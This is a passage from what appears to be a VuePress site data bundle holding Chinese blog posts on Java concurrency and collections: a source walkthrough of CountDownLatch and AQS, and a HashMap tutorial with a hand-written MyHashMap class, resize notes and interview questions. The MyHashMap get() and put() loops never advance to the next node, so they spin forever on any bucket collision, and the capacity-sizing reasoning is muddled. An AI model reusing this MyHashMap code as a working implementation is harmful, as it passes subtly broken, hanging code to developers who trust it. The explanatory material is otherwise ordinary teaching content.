false;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nSync 类重写了 releaseShared (int) 方法：\n\n可以看到，在执行 sync.releaseShared (1) 方法时，其在调用 tryReleaseShared (int) 方法时会在无限 for 循环中设置 state 属性的值，设置成功之后其会根据设置的返回值（此时 state 已经自减了一），即当前线程是否为将 state 属性设置为 0 的线程，来判断是否执行 if 块中的代码（即doReleaseShared()）。\n\nprotected boolean tryReleaseShared(int releases) {\n    // Decrement count; signal when transition to zero\n    for (;;) {\n        // 获取同步状态\n        int c = getState();\n        // 同步状态为0，则直接返回\n        if (c == 0)\n            return false;\n        // 计算并更新同步状态\n        int nextc = c-1;\n        if (compareAndSetState(c, nextc))\n            return nextc == 0;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ndoReleaseShared () 方法主要作用是唤醒调用了 await () 方法的线程。需要注意的是，如果有多个线程调用了 await () 方法，这些线程都是以共享的方式等待在 await () 方法处的，试想，如果以独占的方式等待，那么当计数器减少至零时，就只有一个线程会被唤醒执行 await () 之后的代码，这显然不符合逻辑。如下是 doReleaseShared () 方法的实现代码：\n\nprivate void doReleaseShared() {\n  for (;;) {\n    Node h = head;  // 记录等待队列中的头结点的线程\n    if (h != null && h != tail) {   // 头结点不为空，且头结点不等于尾节点\n      int ws = h.waitStatus;\n      if (ws == Node.SIGNAL) {  // SIGNAL状态表示当前节点正在等待被唤醒\n        if (!compareAndSetWaitStatus(h, Node.SIGNAL, 0))    // 清除当前节点的等待状态\n          continue;\n        unparkSuccessor(h); // 唤醒当前节点的下一个节点\n      } else if (ws == 0 && !compareAndSetWaitStatus(h, 0, Node.PROPAGATE))\n        continue;\n    }\n    // 如果h还是指向头结点，说明前面这段代码执行过程中没有其他线程对头结点进行过处理\n    if (h == head)  \n      break;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 参考\n\nJava 并发编程之 CountDownLatch 详解\n\nCountDownLatch 详解',normalizedContent:'依靠 aqs类中锁标记 state 实现的，任务的分割与合并。\n\n\n\n * 适用场景\n * countdownlatch解析\n   * await () 方法\n   * countdown () 方法\n * 参考\n\n\n\n\n# 适用场景\n\n * 常和线程池共同出现，用做任务的分割合并，如：\n   \n   我们有90万数据，需要多线程多 sheet 页导出 excel，这时候就需要用到 countdownlatch 来将这一任务具体细分。\n   \n   1. 将导出 excel 看作一项大任务。\n   \n   2. 用线程池操作，导出的每个 sheet 页为其中一项小任务。\n      \n      2.1 告诉 countdownlatch 总任务数\n      \n      countdownlatch countdownlatch = new countdownlatch(任务总数);\n      \n      2.2 每完成一个任务就调用countdownlatch.countdown();（任务数-1）表示此项小任务已完成\n   \n   3. 在主线程调用countdownlatch.await();（即直到任务数为0时）等待所有小任务完成后，再执行其他操作。\n      \n      当然，为防止一直等待，可以加个超时时间countdownlatch.await(10l,timeunit.seconds);，超出时间后不再等待，直接唤醒 await 线程进行下一步操作。\n\n * 以上思路实例代码可见另一篇poi多线程多sheet导出excel,csv\n\n\n# countdownlatch解析\n\ncountdownlatch 类图如下:\n\n\n\n从图中可以看出，countdownlatch 内部依赖 sync 实现，而 sync 继承自 aqs。countdownlatch 仅提供了一个构造方法：\n\npublic countdownlatch(int count) {\n    if (count < 0) throw new illegalargumentexception("count < 0");\n\n    this.sync = new sync(count);\n}\n\n\n1\n2\n3\n4\n5\n\n\nsync 是 countdownlatch 的静态内部类，其定义也比较简单，如下所示：\n\nprivate static final class sync extends abstractqueuedsynchronizer {\n\n    private static final long serialversionuid = 4982264981922014374l;\n\n    // 设置同步状态值（锁标记）\n    sync(int count) {\n        setstate(count);\n    }\n\n    // 获取同步状态值\n    int getcount() {\n        return getstate();\n    }\n    \n    // 共享式获取同步状态\n    protected int tryacquireshared(int acquires) {\n        return (getstate() == 0) ? 1 : -1;\n    }\n\n    // 共享式释放同步状态\n    protected boolean tryreleaseshared(int releases) {\n        // decrement count; signal when transition to zero\n        for (;;) {\n            // 获取当前state属性的值\n            int c = getstate();\n            // 如果state为0，则说明当前计数器已经计数完成，直接返回\n            if (c == 0)\n                return false;\n            int nextc = c-1;\n            // 使用cas算法对state进行设置\n            if (compareandsetstate(c, nextc))\n                // 设置成功后返回当前是否为最后一个设置state的线程\n                return nextc == 0;\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n\n# await () 方法\n\ncountdownlatch 提供了 await () 方法来使当前线程一直等待，直到计数器的值减为 0，或者线程被中断，该方法定义如下：\n\npublic void await() throws interruptedexception {\n    sync.acquiresharedinterruptibly(1);\n}\n\n\n1\n2\n3\n\n\nawait () 方法调用了 aqs 的共享式相应中断获取同步状态的方法，acquiresharedinterruptibly (int)，如下所示：\n\npublic final void acquiresharedinterruptibly(int arg)\n        throws interruptedexception {\n\n    if (thread.interrupted())\n        throw new interruptedexception();\n\n    if (tryacquireshared(arg) < 0)\n        doacquiresharedinterruptibly(arg);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nsync 类重写了 tryacquireshared (int) 方法：\n\nprotected int tryacquireshared(int acquires) {\n    return (getstate() == 0) ? 1 : -1;\n}\n\n\n1\n2\n3\n\n\n可以看到，只有当计数器（即同步状态）值为 0 时，才返回 1，即当前线程获取到了同步状态，在这里表示等待线程可以继续执行，若计数器值不是 0，则当前线程会调用 doacquiresharedinterruptibly (int) 方法，一直自旋去尝试获取同步状态：\n\nprivate void doacquiresharedinterruptibly(int arg) throws interruptedexception {\n  final node node = addwaiter(node.shared); // 使用当前线程创建一个共享模式的节点\n  boolean failed = true;\n  try {\n    for (;;) {\n      final node p = node.predecessor();    // 获取当前节点的前一个节点\n      if (p == head) {  // 判断前一个节点是否为头结点\n        int r = tryacquireshared(arg);  // 查看当前线程是否获取到了执行权限\n        if (r >= 0) {   // 大于0表示获取了执行权限\n          \n          /* 发现 r 大于 0（因为 state 已经被置为 0 了），\n           * 该线程就会调用 setheadandpropagate (node, int) 方法，\n           * 并且退出当前循环，\n           * 也就开始执行我们调用 await() 方法之后的代码\n           */\n          setheadandpropagate(node, r); // 将当前节点设置为头结点，并且唤醒后面处于等待状态的节点\n          p.next = null; // help gc\n          failed = false;\n          return;\n        }\n      }\n      \n      // 走到这一步说明没有获取到执行权限，就使当前线程进入“搁置”状态\n      if (shouldparkafterfailedacquire(p, node) &&\n          parkandcheckinterrupt())\n        throw new interruptedexception();\n    }\n  } finally {\n    if (failed)\n      cancelacquire(node);\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n这里我们看看 setheadandpropagate (node, int) 方法的具体实现：\n\nprivate void setheadandpropagate(node node, int propagate) {\n  node h = head;\n  sethead(node);    // 将当前节点设置为头节点\n  // 检查唤醒过程是否需要往下传递，并且检查头结点的等待状态\n  if (propagate > 0 || h == null || h.waitstatus < 0 ||\n      (h = head) == null || h.waitstatus < 0) {\n    node s = node.next;\n    if (s == null || s.isshared())  // 如果下一个节点是尝试以共享状态获取获取执行权限的节点，则将其唤醒\n      doreleaseshared();\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nsetheadandpropagate (node, int) 方法主要作用是设置当前节点为头结点，并且将唤醒工作往下传递，在传递的过程中，其会判断被传递的节点是否是以共享模式尝试获取执行权限的，如果不是，则传递到该节点处为止（一般情况下，等待队列中都只会都是处于共享模式或者处于独占模式的节点）。也就是说，头结点会依次唤醒后续处于共享状态的节点，这也就是共享锁与独占锁的实现方式。这里 doreleaseshared () 方法也就是我们前面讲到的会将离头结点最近的一个处于等待状态的节点唤醒的方法。\n\n\n# countdown () 方法\n\ncountdownlatch 提供了 countdown () 方法递减计数器的值，如果计数到达 0，则释放所有等待的线程，该方法定义如下：\n\npublic void countdown() {\n    sync.releaseshared(1);\n}\n\n\n1\n2\n3\n\n\ncountdown () 方法调用了 aqs 的 releaseshared (int) 方法来释放共享锁同步状态：\n\npublic final boolean releaseshared(int arg) {\n    if (tryreleaseshared(arg)) {\n        //doreleaseshared()主要作用是唤醒调用了await()方法的线程\n        doreleaseshared();\n        return true;\n    }\n    return false;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nsync 类重写了 releaseshared (int) 方法：\n\n可以看到，在执行 sync.releaseshared (1) 方法时，其在调用 tryreleaseshared (int) 方法时会在无限 for 循环中设置 state 属性的值，设置成功之后其会根据设置的返回值（此时 state 已经自减了一），即当前线程是否为将 state 属性设置为 0 的线程，来判断是否执行 if 块中的代码（即doreleaseshared()）。\n\nprotected boolean tryreleaseshared(int releases) {\n    // decrement count; signal when transition to zero\n    for (;;) {\n        // 获取同步状态\n        int c = getstate();\n        // 同步状态为0，则直接返回\n        if (c == 0)\n            return false;\n        // 计算并更新同步状态\n        int nextc = c-1;\n        if (compareandsetstate(c, nextc))\n            return nextc == 0;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ndoreleaseshared () 方法主要作用是唤醒调用了 await () 方法的线程。需要注意的是，如果有多个线程调用了 await () 方法，这些线程都是以共享的方式等待在 await () 方法处的，试想，如果以独占的方式等待，那么当计数器减少至零时，就只有一个线程会被唤醒执行 await () 之后的代码，这显然不符合逻辑。如下是 doreleaseshared () 方法的实现代码：\n\nprivate void doreleaseshared() {\n  for (;;) {\n    node h = head;  // 记录等待队列中的头结点的线程\n    if (h != null && h != tail) {   // 头结点不为空，且头结点不等于尾节点\n      int ws = h.waitstatus;\n      if (ws == node.signal) {  // signal状态表示当前节点正在等待被唤醒\n        if (!compareandsetwaitstatus(h, node.signal, 0))    // 清除当前节点的等待状态\n          continue;\n        unparksuccessor(h); // 唤醒当前节点的下一个节点\n      } else if (ws == 0 && !compareandsetwaitstatus(h, 0, node.propagate))\n        continue;\n    }\n    // 如果h还是指向头结点，说明前面这段代码执行过程中没有其他线程对头结点进行过处理\n    if (h == head)  \n      break;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 参考\n\njava 并发编程之 countdownlatch 详解\n\ncountdownlatch 详解',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"HashMap 底层实现和原理",frontmatter:{title:"HashMap 底层实现和原理",date:"2019-06-13T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/HashMap.html",relativePath:"views/backend/HashMap.md",key:"v-149384d8",path:"/views/backend/HashMap.html",headers:[{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:3},{level:2,title:"继承关系",slug:"继承关系",normalizedTitle:"继承关系",charIndex:9},{level:2,title:"实现原理",slug:"实现原理",normalizedTitle:"实现原理",charIndex:17},{level:2,title:"手写一个简单的HashMap",slug:"手写一个简单的hashmap",normalizedTitle:"手写一个简单的hashmap",charIndex:25},{level:2,title:"HashMap的扩容机制 resize()",slug:"hashmap的扩容机制-resize",normalizedTitle:"hashmap的扩容机制 resize()",charIndex:43},{level:3,title:"HashMap的负载因子",slug:"hashmap的负载因子",normalizedTitle:"hashmap的负载因子",charIndex:70},{level:3,title:"先说HashMap底层数组长度扩容为什么是2的幂次方数(其实就是为了使hash均匀分组)",slug:"先说hashmap底层数组长度扩容为什么是2的幂次方数-其实就是为了使hash均匀分组",normalizedTitle:"先说hashmap底层数组长度扩容为什么是2的幂次方数(其实就是为了使hash均匀分组)",charIndex:88},{level:3,title:"再来说HashMap的resize()",slug:"再来说hashmap的resize",normalizedTitle:"再来说hashmap的resize()",charIndex:138},{level:2,title:"HashMap面试题",slug:"hashmap面试题",normalizedTitle:"hashmap面试题",charIndex:161}],headersStr:"简介 继承关系 实现原理 手写一个简单的HashMap HashMap的扩容机制 resize() HashMap的负载因子 先说HashMap底层数组长度扩容为什么是2的幂次方数(其实就是为了使hash均匀分组) 再来说HashMap的resize() HashMap面试题",content:' * 简介\n * 继承关系\n * 实现原理\n * 手写一个简单的HashMap\n * HashMap的扩容机制 resize()\n   * HashMap的负载因子\n   * 先说HashMap底层数组长度扩容为什么是2的幂次方数(其实就是为了使hash均匀分组)\n   * 再来说HashMap的resize()\n * HashMap面试题\n\n\n\n\n# 简介\n\n * HashMap是一个散列桶（数组和链表），它存储的内容是键值对(key-value)映射\n * HashMap采用了数组和链表的数据结构，方便继承了数组的线性查找和链表的寻址修改\n * HashMap是非synchronized（但是在rehash和扩容的时候可能出现并发问题），所以HashMap很快\n * HashMap可以接受null键和值，而Hashtable则不能（原因就是equlas()方法需要对象）\n\n\n# 继承关系\n\npublic class HashMap<K,V> extends AbstractMap<K,V>\n    implements Map<K,V>, Cloneable, Serializable {\n\n\n1\n2\n\n\n\n# 实现原理\n\n * HashMap由数组+链表(+红黑树 1.8)来实现对数据的存储\n * 详细可以看：HashMap原理深入理解\n\n\n\n\n# 手写一个简单的HashMap\n\n * 很简单，就是看一下HashMap源码中定义了什么属性、方法，然后我们写一个简单的类继承HashMap，挑其中几个重要的方法做出实现就好了\n\npackage com.eee;\n\nimport java.util.HashMap;\n\n/**\n * @className: MyHashMap\n * @descripe: 模拟HashMap底层实现\n * @author: zpj\n * @date: 2019/6/7\n * @version: 1.0\n */\npublic class MyHashMap<key,value> extends HashMap<key,value>{\n\n    //定义一个数组\n    private Node<key,value>[] table; \n    //初始化数组容量大小为 16\n    private static Integer CSHSZRL = 16;\n    //定义一个size，用来统计HashMap内个数\n    private int size = 0;\n\n    public MyHashMap() {\n        //创建对象的时候就初始化数组\n        table = new Node[CSHSZRL];\n    }\n\n    @Override\n    public int size() {\n        return size;\n    }\n\n    @Override\n    public value get(Object key) {\n        //算出这个节点是在哪个hash组\n        int hash = key.hashCode();\n        int index = hash % table.length;\n\n        //遍历\n        for(Node<key,value> node = table[index];table[index]!=null;node.getNext()){\n            //新元素和老元素一样的话\n            if(node.getK().equals(key)){\n                return node.getV();\n            }\n        }\n        return null;\n    }\n\n    @Override\n    public boolean containsKey(Object key) {\n        return super.containsKey(key);\n    }\n\n    /**\n     * HashMap的 put()方法\n     * @param key\n     * @param value\n     * @return 当put元素出现重复的时候，新元素覆盖老元素，返回老元素的value\n     */\n    @Override\n    public value put(key key, value value) {\n        //算出这个节点是在哪个hash组\n        int hash = key.hashCode();\n        int index = hash % table.length;\n\n        //新增元素时，遍历老元素，和新元素比较\n        for(Node<key,value> node = table[index];table[index]!=null;node.getNext()){\n            //新元素和老元素一样的话\n            if(node.k.equals(key)){\n                value oldValue = node.v;\n                node.v=value;\n                return oldValue;\n            }\n        }\n        \n        //当put第N个元素\n        addNode(key, value, index);\n\n        return null;\n    }\n\n    private void addNode(key key, value value, int index) {\n        //Node<key, value> node = new Node<>(key, value, null);//这个hash组是空的，put第一个元素\n        //table[index] = node;\n\n        //老节点对象\n        Node node = table[index];\n        //再把新的节点对象追加到原先节点头部,形成链表\n        table[index] = new Node(key,value,node);\n        //每增加一个元素，HashMap内 个数加1\n        size++;\n    }\n\n    @Override\n    public value remove(Object key) {\n        return super.remove(key);\n    }\n\n    /**\n     * 源码中定义了一个节点类对象，用来存放每个数据\n     * @param <K>\n     * @param <V>\n     */\n    static class Node<K,V> {\n\n        private K k;\n        private V v;\n        //用来充当链表\n        private Node<K,V> next;\n\n        //可以传入新元素，然后构成链表\n        public Node(K k, V v, Node<K, V> next) {\n            this.k = k;\n            this.v = v;\n            this.next = next;\n        }\n\n        public K getK() {\n            return k;\n        }\n\n        public V getV() {\n            return v;\n        }\n\n        public Node<K, V> getNext() {\n            return next;\n        }\n    }\n\n    public static void main(String[] args){\n        MyHashMap<String,String> myHashMap = new MyHashMap<>();\n        for (int x=0;x<10;x++){\n            myHashMap.put(x+"貂蝉",x+"貂蝉配吕布");\n        }\n        myHashMap.put("8貂蝉","8貂蝉戏吕布");\n        System.out.println(myHashMap.get("8貂蝉"));\n        System.out.println(myHashMap.size());\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n\n\n\n# HashMap的扩容机制 resize()\n\n * 这一节是整个文章的重点，也是我学习的重点笔记，从这我也理解了为什么阿里规范手册中初始化HashMap的时候要指定大小。\n\n\n# HashMap的负载因子\n\n 1. 负载因子loadFactor保持在0.75f是在时间跟空间上达到一个平衡，实际上也就是说0.75f是效率相对比较高的\n\n\n# 先说HashMap底层数组长度扩容为什么是2的幂次方数(其实就是为了使hash均匀分组)\n\n 1. 只有当数组长度为2的幂次方时，hash&(length-1)才等价于h%length，即实现了key的hash定位，2的幂次方也可以减少冲突次数，提高HashMap的查询效率；\n\n 2. 如果 length 为 2 的次幂 则 length-1 转化为二进制必定是 11111……的形式，再于 hash 的二进制与操作效率会非常的快，而且空间不浪费；如果 length 不是 2 的次幂，比如 length 为 15，则 length - 1 为 14，对应的二进制为 1110，再于 hash 与操作，最后一位都为 0 ，而 0001，0011，0101，1001，1011，0111，1101 这几个位置永远都不能存放元素了（这几个数最后一位都是1，化为10进制为1，3，5，9，11，7，13），空间浪费相当大，更糟的是这种情况中，数组可以使用的位置比数组长度小了很多，这意味着进一步增加了碰撞的几率，减慢了查询的效率！这样就会造成空间的浪费。\n\n\n# 再来说HashMap的resize()\n\n 1. 当hashmap中的元素越来越多的时候，碰撞的几率也就越来越高（因为数组的长度是固定的），所以为了提高查询的效率，就要对hashmap的数组进行扩容，数组扩容这个操作也会出现在ArrayList中，所以这是一个通用的操作，很多人对它的性能表示过怀疑，不过想想我们的“均摊”原理，就释然了，而在hashmap数组扩容之后，最消耗性能的点就出现了：原数组中的数据必须重新计算其在新数组中的位置，并放进去，这就是resize()。\n\n 2. 那么hashmap什么时候进行扩容呢？当hashmap中的元素个数超过数组大小*loadFactor时，就会进行数组扩容，loadFactor的默认值为0.75，也就是说，默认情况下，数组大小为16，那么当hashmap中元素个数超过16*0.75=12的时候，就把数组的大小扩展为2*16=32，即扩大一倍，然后重新计算每个元素在数组中的位置，而这是一个非常消耗性能的操作，所以如果我们已经预知hashmap中元素的个数，那么预设元素的个数能够有效的提高hashmap的性能。比如说，我们有1000个元素new HashMap(1000), 但是理论上来讲new HashMap(1024)更合适，不过扩容是2的幂次方数，即使是1000，hashmap也自动会将其设置为1024。 但是new HashMap(1024)还不是更合适的，因为0.75*1000 < 1000, 也就是说为了让0.75 * size > 1000, 我们必须这样new HashMap(2048)才最合适，既考虑了&的问题，也避免了resize的问题。\n    \n    > 具体resize()的实现可以看：https://blog.csdn.net/u010890358/article/details/80496144\n\n\n# HashMap面试题\n\n 1.  hashmap的主要参数都有哪些？\n\n 2.  hashmap的数据结构是什么样子的？自己如何实现一个hashmap？\n\n 3.  hash计算规则是什么？\n\n 4.  说说hashmap的存取过程？\n\n 5.  说说hashmap如何处理碰撞的，或者说说它的扩容？\n     \n     == 答案 ==\n\n 6.  针对 HashMap 中某个 Entry 链太长，查找的时间复杂度可能达到 O(n)，怎么优化？\n\n 7.  如果HashMap的大小超过了负载因子(load factor)定义的容量，怎么办？\n\n 8.  为什么String, Interger这样的类适合作为键？\n\n 9.  HashMap与HashTable区别，能否让HashMap同步？\n     \n     == 答案 ==\n\n 10. HashMap 的 table 的容量如何确定？loadFactor 是什么？ 该容量如何变化？这种变化会带来什么问题？\n\n 11. HashMap 的遍历方式及其性能对比\n\n 12. HashMap，LinkedHashMap，TreeMap 有什么区别？\n\n 13. HashMap & TreeMap & LinkedHashMap 使用场景？\n\n 14. 为什么 ConcurrentHashMap 比 HashTable 效率要高，及ConcurrentHashMap？\n     \n     == 答案 ==\n\n 15. hashMap put()',normalizedContent:' * 简介\n * 继承关系\n * 实现原理\n * 手写一个简单的hashmap\n * hashmap的扩容机制 resize()\n   * hashmap的负载因子\n   * 先说hashmap底层数组长度扩容为什么是2的幂次方数(其实就是为了使hash均匀分组)\n   * 再来说hashmap的resize()\n * hashmap面试题\n\n\n\n\n# 简介\n\n * hashmap是一个散列桶（数组和链表），它存储的内容是键值对(key-value)映射\n * hashmap采用了数组和链表的数据结构，方便继承了数组的线性查找和链表的寻址修改\n * hashmap是非synchronized（但是在rehash和扩容的时候可能出现并发问题），所以hashmap很快\n * hashmap可以接受null键和值，而hashtable则不能（原因就是equlas()方法需要对象）\n\n\n# 继承关系\n\npublic class hashmap<k,v> extends abstractmap<k,v>\n    implements map<k,v>, cloneable, serializable {\n\n\n1\n2\n\n\n\n# 实现原理\n\n * hashmap由数组+链表(+红黑树 1.8)来实现对数据的存储\n * 详细可以看：hashmap原理深入理解\n\n\n\n\n# 手写一个简单的hashmap\n\n * 很简单，就是看一下hashmap源码中定义了什么属性、方法，然后我们写一个简单的类继承hashmap，挑其中几个重要的方法做出实现就好了\n\npackage com.eee;\n\nimport java.util.hashmap;\n\n/**\n * @classname: myhashmap\n * @descripe: 模拟hashmap底层实现\n * @author: zpj\n * @date: 2019/6/7\n * @version: 1.0\n */\npublic class myhashmap<key,value> extends hashmap<key,value>{\n\n    //定义一个数组\n    private node<key,value>[] table; \n    //初始化数组容量大小为 16\n    private static integer cshszrl = 16;\n    //定义一个size，用来统计hashmap内个数\n    private int size = 0;\n\n    public myhashmap() {\n        //创建对象的时候就初始化数组\n        table = new node[cshszrl];\n    }\n\n    @override\n    public int size() {\n        return size;\n    }\n\n    @override\n    public value get(object key) {\n        //算出这个节点是在哪个hash组\n        int hash = key.hashcode();\n        int index = hash % table.length;\n\n        //遍历\n        for(node<key,value> node = table[index];table[index]!=null;node.getnext()){\n            //新元素和老元素一样的话\n            if(node.getk().equals(key)){\n                return node.getv();\n            }\n        }\n        return null;\n    }\n\n    @override\n    public boolean containskey(object key) {\n        return super.containskey(key);\n    }\n\n    /**\n     * hashmap的 put()方法\n     * @param key\n     * @param value\n     * @return 当put元素出现重复的时候，新元素覆盖老元素，返回老元素的value\n     */\n    @override\n    public value put(key key, value value) {\n        //算出这个节点是在哪个hash组\n        int hash = key.hashcode();\n        int index = hash % table.length;\n\n        //新增元素时，遍历老元素，和新元素比较\n        for(node<key,value> node = table[index];table[index]!=null;node.getnext()){\n            //新元素和老元素一样的话\n            if(node.k.equals(key)){\n                value oldvalue = node.v;\n                node.v=value;\n                return oldvalue;\n            }\n        }\n        \n        //当put第n个元素\n        addnode(key, value, index);\n\n        return null;\n    }\n\n    private void addnode(key key, value value, int index) {\n        //node<key, value> node = new node<>(key, value, null);//这个hash组是空的，put第一个元素\n        //table[index] = node;\n\n        //老节点对象\n        node node = table[index];\n        //再把新的节点对象追加到原先节点头部,形成链表\n        table[index] = new node(key,value,node);\n        //每增加一个元素，hashmap内 个数加1\n        size++;\n    }\n\n    @override\n    public value remove(object key) {\n        return super.remove(key);\n    }\n\n    /**\n     * 源码中定义了一个节点类对象，用来存放每个数据\n     * @param <k>\n     * @param <v>\n     */\n    static class node<k,v> {\n\n        private k k;\n        private v v;\n        //用来充当链表\n        private node<k,v> next;\n\n        //可以传入新元素，然后构成链表\n        public node(k k, v v, node<k, v> next) {\n            this.k = k;\n            this.v = v;\n            this.next = next;\n        }\n\n        public k getk() {\n            return k;\n        }\n\n        public v getv() {\n            return v;\n        }\n\n        public node<k, v> getnext() {\n            return next;\n        }\n    }\n\n    public static void main(string[] args){\n        myhashmap<string,string> myhashmap = new myhashmap<>();\n        for (int x=0;x<10;x++){\n            myhashmap.put(x+"貂蝉",x+"貂蝉配吕布");\n        }\n        myhashmap.put("8貂蝉","8貂蝉戏吕布");\n        system.out.println(myhashmap.get("8貂蝉"));\n        system.out.println(myhashmap.size());\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n\n\n\n# hashmap的扩容机制 resize()\n\n * 这一节是整个文章的重点，也是我学习的重点笔记，从这我也理解了为什么阿里规范手册中初始化hashmap的时候要指定大小。\n\n\n# hashmap的负载因子\n\n 1. 负载因子loadfactor保持在0.75f是在时间跟空间上达到一个平衡，实际上也就是说0.75f是效率相对比较高的\n\n\n# 先说hashmap底层数组长度扩容为什么是2的幂次方数(其实就是为了使hash均匀分组)\n\n 1. 只有当数组长度为2的幂次方时，hash&(length-1)才等价于h%length，即实现了key的hash定位，2的幂次方也可以减少冲突次数，提高hashmap的查询效率；\n\n 2. 如果 length 为 2 的次幂 则 length-1 转化为二进制必定是 11111……的形式，再于 hash 的二进制与操作效率会非常的快，而且空间不浪费；如果 length 不是 2 的次幂，比如 length 为 15，则 length - 1 为 14，对应的二进制为 1110，再于 hash 与操作，最后一位都为 0 ，而 0001，0011，0101，1001，1011，0111，1101 这几个位置永远都不能存放元素了（这几个数最后一位都是1，化为10进制为1，3，5，9，11，7，13），空间浪费相当大，更糟的是这种情况中，数组可以使用的位置比数组长度小了很多，这意味着进一步增加了碰撞的几率，减慢了查询的效率！这样就会造成空间的浪费。\n\n\n# 再来说hashmap的resize()\n\n 1. 当hashmap中的元素越来越多的时候，碰撞的几率也就越来越高（因为数组的长度是固定的），所以为了提高查询的效率，就要对hashmap的数组进行扩容，数组扩容这个操作也会出现在arraylist中，所以这是一个通用的操作，很多人对它的性能表示过怀疑，不过想想我们的“均摊”原理，就释然了，而在hashmap数组扩容之后，最消耗性能的点就出现了：原数组中的数据必须重新计算其在新数组中的位置，并放进去，这就是resize()。\n\n 2. 那么hashmap什么时候进行扩容呢？当hashmap中的元素个数超过数组大小*loadfactor时，就会进行数组扩容，loadfactor的默认值为0.75，也就是说，默认情况下，数组大小为16，那么当hashmap中元素个数超过16*0.75=12的时候，就把数组的大小扩展为2*16=32，即扩大一倍，然后重新计算每个元素在数组中的位置，而这是一个非常消耗性能的操作，所以如果我们已经预知hashmap中元素的个数，那么预设元素的个数能够有效的提高hashmap的性能。比如说，我们有1000个元素new hashmap(1000), 但是理论上来讲new hashmap(1024)更合适，不过扩容是2的幂次方数，即使是1000，hashmap也自动会将其设置为1024。 但是new hashmap(1024)还不是更合适的，因为0.75*1000 < 1000, 也就是说为了让0.75 * size > 1000, 我们必须这样new hashmap(2048)才最合适，既考虑了&的问题，也避免了resize的问题。\n    \n    > 具体resize()的实现可以看：https://blog.csdn.net/u010890358/article/details/80496144\n\n\n# hashmap面试题\n\n 1.  hashmap的主要参数都有哪些？\n\n 2.  hashmap的数据结构是什么样子的？自己如何实现一个hashmap？\n\n 3.  hash计算规则是什么？\n\n 4.  说说hashmap的存取过程？\n\n 5.  说说hashmap如何处理碰撞的，或者说说它的扩容？\n     \n     == 答案 ==\n\n 6.  针对 hashmap 中某个 entry 链太长，查找的时间复杂度可能达到 o(n)，怎么优化？\n\n 7.  如果hashmap的大小超过了负载因子(load factor)定义的容量，怎么办？\n\n 8.  为什么string, interger这样的类适合作为键？\n\n 9.  hashmap与hashtable区别，能否让hashmap同步？\n     \n     == 答案 ==\n\n 10. hashmap 的 table 的容量如何确定？loadfactor 是什么？ 该容量如何变化？这种变化会带来什么问题？\n\n 11. hashmap 的遍历方式及其性能对比\n\n 12. hashmap，linkedhashmap，treemap 有什么区别？\n\n 13. hashmap & treemap & linkedhashmap 使用场景？\n\n 14. 为什么 concurrenthashmap 比 hashtable 效率要高，及concurrenthashmap？\n     \n     == 答案 ==\n\n 15. hashmap put()',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"ReentrantLock 详解",frontmatter:{title:"ReentrantLock 详解",date:"2020-06-19T00:00:00.000Z",tags:["源码分析","多线程","Java"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/ReentrantLock.html",relativePath:"views/backend/ReentrantLock.md",key:"v-7f3e6454",path:"/views/backend/ReentrantLock.html",headers:[{level:2,title:"主要特性：",slug:"主要特性",normalizedTitle:"主要特性：",charIndex:48},{level:2,title:"Lock",slug:"lock",normalizedTitle:"lock",charIndex:57},{level:2,title:"lock() 